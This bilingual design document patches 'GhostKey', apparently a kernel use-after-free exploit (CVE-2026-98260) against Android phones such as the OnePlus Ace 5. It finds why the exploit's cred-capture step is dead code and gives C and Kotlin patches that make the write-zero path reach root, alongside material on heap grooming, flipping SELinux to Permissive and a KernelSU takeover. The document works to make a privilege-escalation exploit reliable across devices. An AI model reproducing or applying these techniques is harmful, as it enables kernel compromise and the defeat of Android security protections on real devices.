## 摘要（中文）

一加 Ace 5（PKG110，内核 6.1.157-android14-11-o-g7cdd565ce1ed）真机日志显示：GhostKey 的校准、task 捕获与 4 轮 UAF 循环全部正常（第 4 轮甚至成功把 SELinux 翻成 Permissive），但 cred 阶段以 `[cred-leak] cred=0 candidates=0` → `[cred] no cred object leaked, abort` 收场，进程此后永久驻留。

源码定位证明这不是环境问题，而是 **2.0.34 引入的结构性死代码**：cred 捕获块位于 `leak_task()` 的 `if (!match) continue` 门禁之后，而真正的 cred 记录（`req=176`）既不命中 task 调用点、也不落在 task_struct 尺寸窗口（4800..5824），`match` 恒为 0，捕获块对真实 cred 记录**永远不可达**。后果是 `g_cred_kva` 恒为 0，写零路径自 2.0.34 起在**任何机型**上都无法到达 root；同时失败路径一律 `for(;;) pause()`，导致父/子进程永久驻留、下一轮被残留进程护栏拦截（exit=8，被迫重启）、宿主空等 300 秒后误报。

本方案以 7 条最小补丁修复四个缺陷：补丁 1 将捕获块移到门禁之前（根因修复，纯移动）；补丁 2 把过滤键改为 profile 驱动并在尺寸冲突时用调用点交叉验证，cred 落空时输出直方图证据；补丁 3 让「从未捕获到 cred」的失败在 daemon-exit 模式下数秒内干净退出（rc=5，含安全性论证）；补丁 4 让宿主 `waitForRootd` 监视进程退出、10 秒宽限窗后即判失败（300s → 数秒）；补丁 5 补失败轮出门打扫（SELinux 告警 + stale 节点重试）；补丁 6 在 FailureDiagnoser 中登记该失败的归因规则；补丁 7 附双语设计说明。

已完成验证：`gcc -fsyntax-only -Wall -Wextra` 零新增告警、干净 `main` worktree 上 `git am` 全系列通过。待执行验证：GitHub Actions 构建、真机门禁 GK-FAILFAST-01（§8.2）。

## Abstract (English)

A OnePlus Ace 5 (PKG110, kernel 6.1.157-android14-11-o-g7cdd565ce1ed) log shows every GhostKey stage before the cred phase working — including four successful UAF cycles that even flipped SELinux to Permissive — yet the cred stage ends with `[cred-leak] cred=0 candidates=0`, and the injector parks forever. Source analysis proves the root cause is **structurally dead code introduced in 2.0.34**: the cred-candidate capture sits behind the `if (!match) continue` gate in `leak_task()`, which genuine cred records (`req=176`) can never pass, so `g_cred_kva` stays 0 on *every* device and the 2.0.34 write-zero path can never reach root. Failure rounds also parked the injector forever, tripped the residual-process guard (exit=8) on the next run, and burned the host's full 300 s budget.

Seven minimal patches fix four defects: move the capture block in front of the gate (patch 1); make the filter profile-driven with a call-site cross-check plus zero-candidate histograms (patch 2); turn the never-captured-cred failure into a clean rc=5 exit with a safety argument (patch 3); fail the host step within seconds via process-exit watching and a 10 s marker grace window (patch 4); add a post-failure sweep — SELinux warning plus stale-node unlink retry (patch 5); register the failure mode in FailureDiagnoser (patch 6); and attach a bilingual design note (patch 7).

Verified here: `gcc -fsyntax-only -Wall -Wextra` with no new warnings, and the whole series applies cleanly with `git am` on a pristine `main` worktree. Pending: GitHub Actions build and the on-device gate GK-FAILFAST-01 (§8.2).

## 1. 背景

### 1.1 GhostKey 引擎与利用链

GhostKey 是 GhostSuite 双引擎套件中基于 CVE-2026-98260（`fput` 引用计数 UAF）的提权引擎，完整流水线分五阶段：

```
calib_a（KASLR slide 校准）
   ↓
calib_b（linear map / page_offset 校准）
   ↓
inject（uaf_plant.c 注入器）
   ├─ rss_stat tracepoint 堆风水 → 定位 fork 出的 task_struct
   ├─ kitimer UAF → 整页堆风水 → 页级写零原语
   ├─ cred 阶段：捕获 cred_jar 对象 → 写零 uid/gid → 获得 root
   └─ SELinux 阶段：翻 Permissive
   ↓
rootd 常驻（daemon-exit 模式）→ ksu-takeover → KSU 管理
```

Shizuku（uid 2000）是强制前置依赖。2.0.34 引入了「cred 捕获」机制：不再伪造 cred 结构（旧的 `g_plant_cred` 伪造路径自 2.0.34 起恒 0，即 B4 已废弃），而是从 tracepoint 记录中**捕获 fork 窗口内真实分配的 cred 对象**，对其做受控写零。

### 1.2 触发事件

2026-11-12，一加 Ace 5 真机跑完整流水线：前两个校准阶段置信度良好，inject 阶段 4 轮 UAF 循环 `result=ok`，但 cred 捕获为 0，最终 `[uaf] missed page; holding zombie` 后进程永久驻留，需要重启才能重试。本方案即针对该日志暴露的失败路径问题。

## 3. 根因分析

### 3.1 RC-1（根因）：cred 捕获块结构性死代码

**位置**：`ghostkey/src/main/cpp/uaf_plant.c` → `leak_task()`（2.0.34 引入时的位置）。

**缺陷机制**——2.0.34 的代码顺序是：

```c
if (want_site && site == want_site) {
        match = 1; by_site++;
} else if (szok) {                     /* szok：task_struct 尺寸窗口 4800..5824 */
        match = 2; by_size++;
} else {
        match = 0; other++;
}
if (!match)
        continue;                      /* ← 真 cred 记录（req=176）永远从这里被跳过 */

/* 2.0.34：cred_child 的 cred 对象捕获 ... */
if (req == 176 && (alloc == 184 || alloc == 192)) {   /* ← 永远不可达 */
        if (!have_cred) {
                g_cred_kva = ptr;
                have_cred = 1;
        }
        ...
}
```

真 cred 记录的三个特征：`req=176`（BTF 实测 `struct cred` object_size=176）、`alloc=184/192`（cred_jar 缓存对齐后）、`call_site` 为 `prepare_creds` 内 `kmem_cache_alloc` 的返回地址。三个特征都无法让它通过上面的 task 匹配：

- 它不是 `task_alloc_link` 的调用点 → `match=1` 不成立；
- 它的尺寸 176/184/192 不在 task_struct 窗口 4800..5824 内 → `match=2` 不成立；
- 于是 `match=0` → `continue` → 捕获块永远执行不到。

**后果链**：

```
捕获块不可达 → have_cred 恒 0 → g_cred_kva 恒 0
   → cred 写零阶段无目标 → "no cred object leaked, abort"
   → 写零路径（2.0.34 引入）在任何机型上都无法到达 root
```

Ace 5 日志 L61/L139（`cred=0 candidates=0` / `no cred object leaked, abort`）是该死代码的第一次真机实证。

### 3.2 RC-2：过滤键硬编码，厂商扩展 cred 的机型即使修好位置也抓不到

过滤条件硬编码 `req==176 && alloc∈{184,192}`。厂商在 `struct cred` 上追加字段（如 OPPO/三星的安全扩展）会使 object_size ≠ 176，捕获随即失效。且旧实现只在 `hits==0`（连 task 都没命中）时才 dump 直方图，「task 命中而 cred 落空」的机型（正是本案例）**拿不到任何排查线索**。

### 3.3 RC-3：失败路径永久驻留 + 宿主空等

`uaf_plant_main()` 所有失败路径一律：

```c
dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
for (;;)
        pause();
```

daemon-exit 模式也不例外。两个连锁后果：

- **a) 残留进程**：父进程与 cred 子进程永久驻留 → 下一轮 `residualNativePids()` 命中 → 宿主本轮以 exit=8 终止 → 用户被迫重启才能重试；
- **b) 空等误报**：宿主 `waitForRootd()` 没有任何可依赖的退出信号，只能轮询日志标记等满 300 秒（`INJECT_TIMEOUT_SEC`），最后把失败误报成 `rootd not ready in time`——真实原因（cred 捕获失败）完全被掩盖。

### 3.4 RC-4：失败轮缺少出门打扫

失败轮直接进入 `finally` 收尾，没有：

- SELinux 翻成 Permissive 后的**明示告警**——下一轮的脏状态预检会以 exit=9 要求重启，用户对此毫无预期；
- stale 节点 unlink 的**重试**——启动时被 Enforcing 拒绝的 unlink，若本轮已把 SELinux 翻成 Permissive，此刻通常可以成功；不重试则 `root-*.sock` 跨轮累积（真机观测到 14 个）。

### 3.5 根因 → 缺陷 → 补丁映射

| 缺陷 | 性质 | 修复补丁 |
| --- | --- | --- |
| RC-1 捕获块死代码 | 根因（任何机型必现） | 补丁 1 |
| RC-2 硬编码过滤键 + 无诊断证据 | 健壮性缺陷 | 补丁 2 |
| RC-3 驻留 + 空等 | 失败处理缺陷 | 补丁 3 + 补丁 4 |

## 4. 修复方案总览

### 4.1 设计原则

1. **最小点状修复**：不重写利用算法，只修位置、过滤键、退场路径；每个提交最小 diff、逐条可审。
2. **失败要快、成功要稳**：只有「从未捕获到 cred 且 daemon-exit」这一失败组合才快速退场；写过 cred 但未验证通过的失败保守驻留不变。
3. **可观测性优先**：落空时必留证据（直方图），误报措辞避开 `error/failed` 以免干扰 FailureDiagnoser 的关键词匹配。
4. **不引入新风险**：误抓通用分配时退化为「不捕获」（与旧行为一致），绝不产生新的内核写目标。

## 5. 逐补丁详解

### 5.1 补丁 1：让 2.0.34 的 cred 捕获真正可达（根因修复）

**动机**：见 §3.1。**改动**：把 cred 捕获块**原样**（逻辑零改动）移到 `if (!match) continue` 门禁之前，并补注释说明死代码历史。

```c
/* 2.0.36 之后：捕获块先于 gate 执行，真 cred 记录（req=176）不再被 continue 跳过 */
if (req == 176 && (alloc == 184 || alloc == 192)) {
        if (!have_cred) {
                g_cred_kva = ptr;
                have_cred = 1;
        }
        ...
}
if (want_site && site == want_site) { match = 1; by_site++; }
else if (szok)                     { match = 2; by_size++; }
else                               { match = 0; other++; }
if (!match)
        continue;
```

**行为影响**：仅此一补丁即可让写零路径在 cred_jar 尺寸为 176 的机型上恢复可达；其余逻辑、顺序、统计口径全部不变。补丁 1 是纯移动 diff（+23/-14，其中大部分是注释），便于评审确认无逻辑漂移。

### 5.2 补丁 2：过滤键 profile 化 + 尺寸冲突交叉验证 + 落空直方图

**动机**：见 §3.2。**改动**三处：

1. **过滤键来自 profile**：

```c
/* cred_size：blob v4 携带 BTF 实测值；v2/v3 由 kernel_table.c 补 6.6 默认 */
int cred_sz = CRED_PLANT_SIZE ? (int)CRED_PLANT_SIZE : 176;
uint64_t cred_site = slide_addr(CRED_LINK);   /* blob 校验保证 CRED_LINK 非零 */
```

2. **alloc 接受窗口 + 尺寸冲突交叉验证**：

```c
if (req == (uint64_t)cred_sz &&
    alloc >= (uint64_t)cred_sz &&
    alloc <= (uint64_t)((cred_sz + 63) & ~63) + 8 &&      /* [sz, ALIGN64(sz)+8] */
    (!cred_size_needs_site((uint64_t)cred_sz) || site == cred_site)) {
```

- 窗口 `[sz, ALIGN64(sz)+8]` 覆盖观测到的 176/184/192 三种缓存尺寸；
- `cred_size_needs_site()`：当 `cred_size` 与通用 kmalloc 尺寸（96/128/192/256）重合时，尺寸单键无法区分 cred_jar 与 kmalloc-N，此时要求 `call_site == slide_addr(CRED_LINK)` 交叉验证。**误抓通用分配的后果是「不捕获」（与旧行为一致），不会引入新的内核写目标。**

3. **落空时无条件输出直方图证据**：

```c
if (!cred_hits) {
        dprintf(STDOUT_FILENO,
                "[cred-leak] no candidate (cred_size=%d cred_site=%#" PRIx64 ")\n",
                cred_sz, cred_site);
        freq_dump("sizes", sizes, nsizes);   /* [task] sizes=0x...:count ... */
        freq_dump("sites", sites, nsites);   /* [task] sites=0x...:count ... */
}
```

旧实现只在 `hits==0` 时 dump——「task 命中而 cred 落空」的机型拿不到任何证据；现在 cred 落空必留直方图，供核对真实 `cred_jar` object_size。

### 5.3 补丁 3：daemon-exit + 从未捕获到 cred → 干净退场（rc=5）

**动机**：见 §3.3。**改动**：`if (!rooted)` 分支头部新增快速退场：

```c
if (daemon_exit && !g_cred_kva) {
        dprintf(STDOUT_FILENO,
                "[uaf] inject failed: no cred object was planted; exiting cleanly\n");
        log_sync();
        kill(g_cred_child_pid, SIGKILL);
        waitpid(g_cred_child_pid, NULL, 0);
        close(g_wake[1]);            /* 关唤醒管道 */
        close(g_report[0]);          /* 关上报管道 */
        close_stream();              /* 释放流/持页资源 */
        free_aio_hold();
        log_sync();
        return 5;                    /* 新退出码：无 cred 快速退场 */
}
/* 旧行为保留： */
dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
for (;;) pause();
```

**安全性**：见 §7。**保守边界**：`g_cred_kva` 非零的失败（cred 字段写过但未验证通过）仍按旧方式驻留——宁可泄漏内存，不冒内核风险。

### 5.4 补丁 4：宿主进程退出感知（300 秒 → 数秒）

**动机**：与补丁 3 配对。native 侧数秒退出后，宿主 `waitForRootd` 仍要等满 300 秒。**改动**：

- `waitForRootd(logFile, proc, timeoutMs)` 增加 `proc.isAlive` 监视；
- 进程退出后先补看 **10 秒宽限窗**（`ROOTD_EXIT_GRACE_MS = 10_000L`）内的就绪标记——daemon-exit 成功路径里父进程会先退、rootd 标记可能晚于父进程落盘，避免误杀成功轮；
- 宽限窗内仍未见到 `C98260_ROOTD_READY=1` 才判失败，并把真实退出码写入运行日志：

```kotlin
if (!proc.isAlive) {
        val graceEnd = System.currentTimeMillis() + ROOTD_EXIT_GRACE_MS
        while (System.currentTimeMillis() < graceEnd) {
                if (tailContains(logFile, ROOTD_MARKER)) return true
                Thread.sleep(400)
        }
        val rc = runCatching { proc.exitValue() }.getOrDefault(-1)
        runCatching {
                logFile.appendText(
                        "<s> note: exploit process exited rc=$rc before rootd was ready; " +
                            "see the last [uaf]/[cred] lines above\n")
        }
        return false
}
```

**措辞约定**：`note:` 一行刻意避开 `error/failed` 字样，使 FailureDiagnoser 继续以 native 侧 `[uaf] inject failed: ...` 行（携带精确失败标签）为归因锚点，避免双规则抢匹配。成功路径唯一开销：每次轮询多一次 `Process.isAlive` 判断（可忽略）。

### 5.5 补丁 5：失败轮出门打扫

**动机**：见 §3.4。**改动**：

- `runChain` 新增 `var runFailed = true` 标志，成功路径置 false 后才 `return 0`；`finally` 中失败轮执行 `postFailureSweep(workDir, callback)`；
- `postFailureSweep`（best-effort，全部 `runCatching` 包裹，不影响退出码）：

```kotlin
private fun postFailureSweep(workDir: File, callback: ICve98260Callback?) {
        val enforce = runCatching {
                File("/sys/fs/selinux/enforce").readText().trim()
        }.getOrNull()
        if (enforce == "0") {
                callback?.onLog("<s> warn: SELinux was left Permissive by this failed run")
                callback?.onLog("<s> warn: injected/pinned kernel state survives until a full reboot")
        }
        val remaining = runCatching { cleanupStale(workDir) }.getOrDefault(-1)
        if (remaining > 0) {
                callback?.onLog("<s> stale sweep after run: $remaining node(s) still locked " +
                    "(unlink denied; reboot clears them)")
        } else if (remaining == 0) {
                callback?.onLog("<b> stale sweep after run: work dir clean")
        }
}
```

- `cleanupStale` 沿用其既有契约：**只删文件，绝不对任何进程发信号**。

## 7. 安全性论证

1. **快速退场只杀「从未被写过的」cred 子进程**：2.0.34 起不再伪造 cred（`g_plant_cred` 恒 0），cred 阶段在 `g_cred_kva=0` 时直接 abort——此时子进程持有的是 fork 时的**原始 `cred_jar` 对象**，对其 SIGKILL 属普通进程退出，无 panic 风险。退场前按序完成：`log_sync()` → `kill+waitpid` → 关管道 → `close_stream()/free_aio_hold()` → `log_sync()` → `return 5`，不遗留持页引用。
2. **交叉验证不会引入新写目标**：`cred_size` 与通用 kmalloc 尺寸重合时强制 `call_site` 命中 `slide_addr(CRED_LINK)`；若交叉验证把真 cred 也拦下，后果只是「不捕获」（与旧行为一致），绝不会把通用分配误当成 cred 去写。
3. **保守驻留边界**：任何 `g_cred_kva≠0` 的失败（cred 字段已被写过）保持旧驻留行为不变——宁可泄漏内存，不冒内核风险。
4. **sweep 只动文件**：`postFailureSweep` 仅重试 `cleanupStale`（unlink 文件）与读 `/sys/fs/selinux/enforce`，绝不对进程发信号；全部 `runCatching` 包裹，不改变退出码。
5. **GhostLock 门禁不受影响**：全部改动位于 `ghostkey/` 目录，未触及 `src/core/` 中 GhostLock 的 8 个反汇编门禁函数，`cmp_disasm` 校验不适用。

## 附录 B. 常见问题（FAQ）

**Q1：UAF 循环 4 轮全 ok，为什么没有 root？**
页级写零原语正常（SELinux 都翻成了 Permissive），坏的是 cred 捕获——而捕获块是死代码，与机型无关。修复后仍需 cred 阶段成功才算到 root。

**Q2：为什么修复后 SIGKILL 子进程是安全的？**
该子进程从未被写过任何 cred 字段（`g_cred_kva=0` 时 cred 阶段直接 abort），持有 fork 时的原始 `cred_jar` 对象，SIGKILL 即普通进程退出。详见 §7。

**Q3：直方图怎么读？**
`freq_dump` 输出十六进制 `key:count` 对。`sizes=` 的 key 是 fork 窗口内的 req 值（如 `0xb0`=176、`0xc0`=192、`0x100`=256）；`sites=` 的 key 是 `kmem_cache_alloc` 调用点。若本机 cred 尺寸 ≠ profile 值，`sizes=` 中会出现对应的高频新条目。

**Q4：`mlockall errno=12` 严重吗？**
RLIMIT_MEMLOCK 64KB（Shizuku shell 上下文）导致的非致命告警，与本失败无关，不影响主流程。

**Q5：为什么宿主 note 行不用 error/failed 字样？**
FailureDiagnoser 按关键词归因；宿主行只做事实记录，归因锚点统一交给携带精确失败标签的 native 行 `[uaf] inject failed: ...`。

**Q6：修复会让本来成功的机型变吗？**
成功路径行为不变；唯一新增开销是 `waitForRootd` 每次轮询多一次 `Process.isAlive` 判断。
